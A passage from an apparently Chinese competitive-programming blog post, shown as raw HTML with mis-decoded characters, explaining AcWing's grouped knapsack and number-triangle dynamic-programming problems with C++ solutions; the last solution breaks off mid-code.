class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-9-åˆ†ç»„èƒŒåŒ…é—®é¢˜">AcWing 9. åˆ†ç»„èƒŒåŒ…é—®é¢˜</h2><p><code>éš¾åº¦ï¼šä¸­ç­‰</code></p><p>æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> ç»„ç‰©å“å’Œä¸€ä¸ªå®¹é‡æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span> çš„èƒŒåŒ…ã€‚</p><p>æ¯ç»„ç‰©å“æœ‰è‹¥å¹²ä¸ªï¼ŒåŒä¸€ç»„å†…çš„ç‰©å“æœ€å¤šåªèƒ½é€‰ä¸€ä¸ªã€‚<br>æ¯ä»¶ç‰©å“çš„ä½“ç§¯æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi mathvariant="normal">_</mi><mrow><mi>i</mi><mi>j</mi></mrow></mrow><annotation encoding="application/x-tex">v\_{ij}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">ij</span></span></span></span></span>ï¼Œä»·å€¼æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi><mi mathvariant="normal">_</mi><mrow><mi>i</mi><mi>j</mi></mrow></mrow><annotation encoding="application/x-tex">w\_{ij}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">ij</span></span></span></span></span>ï¼Œå…¶ä¸­ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> æ˜¯ç»„å·ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> æ˜¯ç»„å†…ç¼–å·ã€‚</p><p>æ±‚è§£å°†å“ªäº›ç‰©å“è£…å…¥èƒŒåŒ…ï¼Œå¯ä½¿ç‰©å“æ€»ä½“ç§¯ä¸è¶…è¿‡èƒŒåŒ…å®¹é‡ï¼Œä¸”æ€»ä»·å€¼æœ€å¤§ã€‚</p><p>è¾“å‡ºæœ€å¤§ä»·å€¼ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡Œæœ‰ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mtext>ï¼Œ</mtext><mi>V</mi></mrow><annotation encoding="application/x-tex">Nï¼ŒV</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span>ï¼Œç”¨ç©ºæ ¼éš”å¼€ï¼Œåˆ†åˆ«è¡¨ç¤ºç‰©å“ç»„æ•°å’ŒèƒŒåŒ…å®¹é‡ã€‚</p><p>æ¥ä¸‹æ¥æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> ç»„æ•°æ®ï¼š</p><ul><li>æ¯ç»„æ•°æ®ç¬¬ä¸€è¡Œæœ‰ä¸€ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi mathvariant="normal">_</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">S\_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9933em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span></span></span></span>ï¼Œè¡¨ç¤ºç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> ä¸ªç‰©å“ç»„çš„ç‰©å“æ•°é‡ï¼›</li><li>æ¯ç»„æ•°æ®æ¥ä¸‹æ¥æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi mathvariant="normal">_</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">S\_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9933em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span></span></span></span> è¡Œï¼Œæ¯è¡Œæœ‰ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi mathvariant="normal">_</mi><mrow><mi>i</mi><mi>j</mi></mrow><mo separator="true">,</mo><mi>w</mi><mi mathvariant="normal">_</mi><mrow><mi>i</mi><mi>j</mi></mrow></mrow><annotation encoding="application/x-tex">v\_{ij}, w\_{ij}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">ij</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">ij</span></span></span></span></span>ï¼Œç”¨ç©ºæ ¼éš”å¼€ï¼Œåˆ†åˆ«è¡¨ç¤ºç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> ä¸ªç‰©å“ç»„çš„ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> ä¸ªç‰©å“çš„ä½“ç§¯å’Œä»·å€¼ï¼›</li></ul><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæœ€å¤§ä»·å€¼ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>N</mi><mo separator="true">,</mo><mi>V</mi><mo>â‰¤</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">0 \lt N, V \le 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>S</mi><mi mathvariant="normal">_</mi><mi>i</mi><mo>â‰¤</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">0 \lt S\_i \le 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9933em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>v</mi><mi mathvariant="normal">_</mi><mrow><mi>i</mi><mi>j</mi></mrow><mo separator="true">,</mo><mi>w</mi><mi mathvariant="normal">_</mi><mrow><mi>i</mi><mi>j</mi></mrow><mo>â‰¤</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">0 \lt v\_{ij}, w\_{ij} \le 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">ij</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">ij</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹</strong></p><pre><code>3 521 22 413 414 5</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>8</code></pre><h3 id="ä¸€ç»´dpæ•°ç»„-2">ä¸€ç»´dpæ•°ç»„</h3><ul><li>çŠ¶æ€è®¡ç®— <code>f[i][j] = f[i - 1][j - v[i][k]] + w[i][k]</code><ul><li>æŒ‰ç…§iç»„ç‰©å“é€‰ä¸é€‰ã€é€‰ç¬¬å‡ ä¸ªè¿›è¡Œåˆ†ç±»</li><li>ä¸é€‰ <code>f[i - 1][j]</code></li><li>é€‰ç¬¬kä¸ª <code>f[i - 1][j - v[i][k]] + w[i][k], k = 1,2,..,si</code></li></ul></li></ul><p>ä½¿ç”¨<code>i-1</code>å±‚ä¿¡æ¯ï¼Œæ”¹è¿›ä¸ºä¸€ç»´åï¼Œä½“ç§¯ä»å¤§åˆ°å°å¾ªç¯ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">110</span>, kM = <span class="number">110</span>;</span><br><span class="line"><span class="type">int</span> n, m, s[kN], v[kN][kM], w[kN][kM];</span><br><span class="line"><span class="type">int</span> f[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;s[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= s[i]; k++) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;v[i][k], &amp;w[i][k]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= s[i]; k++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j &gt;= v[i][k]) &#123;</span><br><span class="line">          <span class="comment">// æœ€å¼€å§‹çš„f[j]å°±æ˜¯f[i - 1][j], å³åŒ…å«ä¸é€‰ç¬¬iç»„ç‰©å“çš„æƒ…å†µ</span></span><br><span class="line">          f[j] = <span class="built_in">max</span>(f[j], f[j - v[i][k]] + w[i][k]);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[m]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è¾¹å¤„ç†è¾¹è®¡ç®—">è¾¹å¤„ç†è¾¹è®¡ç®—</h3><p>ä½“ç§¯å’Œä»·å€¼æ•°ç»„å¯ä»¥ä»äºŒç»´é™ä¸ºä¸€ç»´ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kM = <span class="number">110</span>;</span><br><span class="line"><span class="type">int</span> n, m, v[kM], w[kM];</span><br><span class="line"><span class="type">int</span> f[kM];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="type">int</span> s;</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;s);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= s; k++) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;v[k], &amp;w[k]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= s; k++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j &gt;= v[k]) &#123;  <span class="comment">// ä¸€å®šè¦è®°å¾—åˆ¤æ–­å–”</span></span><br><span class="line">          f[j] = <span class="built_in">max</span>(f[j], f[j - v[k]] + w[k]);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[m]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="çº¿æ€§DP">çº¿æ€§DP</h1><h2 id="AcWing-898-æ•°å­—ä¸‰è§’å½¢"><a href="https://www.acwing.com/problem/content/900/">AcWing 898. æ•°å­—ä¸‰è§’å½¢  </a></h2><p><code>éš¾åº¦ï¼šç®€å•</code></p><p>ç»™å®šä¸€ä¸ªå¦‚ä¸‹å›¾æ‰€ç¤ºçš„æ•°å­—ä¸‰è§’å½¢ï¼Œä»é¡¶éƒ¨å‡ºå‘ï¼Œåœ¨æ¯ä¸€ç»“ç‚¹å¯ä»¥é€‰æ‹©ç§»åŠ¨è‡³å…¶å·¦ä¸‹æ–¹çš„ç»“ç‚¹æˆ–ç§»åŠ¨è‡³å…¶å³ä¸‹æ–¹çš„ç»“ç‚¹ï¼Œä¸€ç›´èµ°åˆ°åº•å±‚ï¼Œè¦æ±‚æ‰¾å‡ºä¸€æ¡è·¯å¾„ï¼Œä½¿è·¯å¾„ä¸Šçš„æ•°å­—çš„å’Œæœ€å¤§ã€‚</p><pre><code>        7      3   8    8   1   0  2   7   4   44   5   2   6   5</code></pre><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>ï¼Œè¡¨ç¤ºæ•°å­—ä¸‰è§’å½¢çš„å±‚æ•°ã€‚</p><p>æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> è¡Œï¼Œæ¯è¡ŒåŒ…å«è‹¥å¹²æ•´æ•°ï¼Œå…¶ä¸­ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> è¡Œè¡¨ç¤ºæ•°å­—ä¸‰è§’å½¢ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> å±‚åŒ…å«çš„æ•´æ•°ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæœ€å¤§çš„è·¯å¾„æ•°å­—å’Œã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>500</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 500</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">500</span></span></span></span>,<br>\-10000 \le ä¸‰è§’å½¢ä¸­çš„æ•´æ•° \le 10000</p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>573 88 1 0 2 7 4 44 5 2 6 5</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>30</code></pre><h3 id="ç®—æ³•1-è‡ªé¡¶å‘ä¸‹åŠ¨æ€è§„åˆ’">ç®—æ³•1 è‡ªé¡¶å‘ä¸‹åŠ¨æ€è§„åˆ’</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">510</span>, kINF = <span class="number">1e9</span>;</span><br><span class="line"><span class="type">int</span> n, a[kN][kN], f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">          <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i][j]);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= i + <span class="number">1</span>; j++) &#123;  <span class="comment">// çŠ¶æ€è®¡ç®—æ—¶ä¼šç”¨åˆ°f[i,0], f[i,i+1]</span></span><br><span class="line">          f[i][j] = -kINF;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  f[<span class="number">1</span>][<span class="number">1</span>] = a[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">          f[i][j] = <span class="built_in">max</span>(f[i - <span class="number">1</span>][j - <span class="number">1</span>], f[i - <span class="number">1</span>][j]) + a[i][j];</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> res = -kINF;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (f[n][i] &gt; res) &#123;</span><br><span class="line">          res = f[n][i];</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç®—æ³•2-è‡ªåº•å‘ä¸ŠåŠ¨æ€è§„åˆ’">ç®—æ³•2 è‡ªåº•å‘ä¸ŠåŠ¨æ€è§„åˆ’</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">510</span>;</span><br><span class="line"><span class="type">int</span> n, f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++) 